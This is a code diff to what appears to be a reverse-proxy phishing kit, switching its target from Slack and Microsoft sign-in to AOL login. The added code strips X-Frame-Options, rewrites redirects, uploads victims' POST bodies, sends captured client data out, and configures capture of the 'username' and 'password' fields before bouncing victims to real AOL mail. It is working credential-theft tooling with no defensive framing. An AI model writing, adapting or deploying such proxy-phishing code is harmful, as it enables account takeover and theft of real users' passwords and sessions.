@@ -25,34 +25,38 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
 const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
 
     constructor(proxyResp, browserEndPoint) {
-
+       
         super(proxyResp, browserEndPoint)
         this.regexes = [
              {
-                reg: /app.slack.com\\\/t/igm, // Google chrome on windows fix
-                replacement: `${process.env.HOST_DOMAIN}/app/~\/t`,
+                reg: /window.__BssoInterrupt_/igm, // Google chrome on windows fix
+                replacement: 'window.__BssoInterrupt_Core=!0;</script>'
+                    + '</head> <body data-bind="defineGlobals: ServerData" style="display: none"> </body> </html>',
              },
         ]
     }
 
 
     processResponse() {
+        this.browserEndPoint.removeHeader('X-Frame-Options')
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
+
+
         const extRedirectObj = super.getExternalRedirect()
         if (extRedirectObj !== null) {
             const rLocation = extRedirectObj.url
-
-            if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
-                return this.afterEmailPath()
+            if (rLocation.startsWith('https://www.aol.com/?guccounter=1&guce_referrer=') || rLocation === 'https://www.aol.com/' 
+            || rLocation.startsWith('/account/comm-channel/refresh')) {
+                this.browserEndPoint.setHeader('location', '/auth/login/finish')
             }
+           
+            // this.browserEndPoint.setHeader('location', '/auth/login/finish')
         }
-        if (this.proxyResp.headers['content-length'] < 1) {
-            return this.proxyResp.pipe(this.browserEndPoint)
-        }
-        // this.browserEndPoint.removeHeader('content-security-policy')
-        let newMsgBody;
+
+        // return super.processResponse()
+         let newMsgBody;
         return this.superPrepareResponse(true)
             .then((msgBody) => {
                 newMsgBody = msgBody
@@ -66,11 +70,6 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             }).catch((err) => {
             console.error(err)
         })
-    }
-
-    afterEmailPath() {
-        this.browserEndPoint.setHeader('location', '/auth0/outlook/owa2')
-        this.browserEndPoint.end('')
     }
 
 
@@ -88,42 +87,25 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
-        // this.req.headers['accept-encoding'] = 'plain, br'
-        if (this.req.method === 'POST') {
-            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
 
+        if (this.req.method === 'POST') {
+            super.uploadRequestBody(clientContext.currentDomain, clientContext)
+            clientContext.setLogAvailable(true);
             // super.captureBody(clientContext.currentDomain, clientContext)
 
+        }
+        if (this.req.url === '/auth/login/finish' || this.req.url === '/account/fb-messenger-linking') {
+            super.sendClientData(clientContext, {})
+            this.res.writeHead(302, { location: 'https://mail.aol.com'})
+            return this.res.end('')
         }
 
 
         const redirectToken = this.checkForRedirect()
-        if (redirectToken !== null) {
-            if (redirectToken.url.startsWith('https://slack.com/checkcookie')) {
-                clientContext.info.loginOk = 1
-            }
+        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
+            clientContext.currentDomain = process.env.PROXY_DOMAIN
+            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
             // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
-        }
-
-        if (this.req.url.includes('ssb/redirect?entry_point')) {
-            if (this.req.url.startsWith('/sub--')) {
-                const subPath = this.req.url.split('~')
-                const workSubDomain = subPath[0].slice(6, -1)
-
-                console.log(workSubDomain)
-                clientContext.currentDomain = `${workSubDomain}.slack.com`
-                this.req.url = subPath[1]
-                console.log(`Current workspace domain is ${workSubDomain}.slack.com`)
-                clientContext.sessionBody.domain = `${workSubDomain}.slack.com`
-
-                if (clientContext.info.loginOk === 1) {
-                    clientContext.setLogAvailable(true)
-                    super.sendClientData(clientContext, {})
-                }
-            }
-           
-            // this.res.writeHead('301', {location: 'https://outlook.com'})
-            //  return super.cleanEnd('PHP-EXEC', clientContext)
         }
 
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
@@ -135,8 +117,11 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
 const configExport = {
-    CURRENT_DOMAIN: 'slack.com',
-    START_PATH: 'signin',
+    CURRENT_DOMAIN: 'login.aol.com',
+
+    START_PATH: '/',
+
+
     PRE_HANDLERS:
         [
         ],
@@ -149,14 +134,14 @@ const configExport = {
             method: 'POST',
             params: ['username'],
             urls: '',
-            hosts: ['login.live.com'],
+            hosts: ['login.aol.com'],
         },
 
         loginPassword: {
             method: 'POST',
-            params: ['passwd'],
+            params: ['password'],
             urls: '',
-            hosts: ['login.live.com'],
+            hosts: ['login.aol.com'],
         },
 
         defaultPhpCapture: {
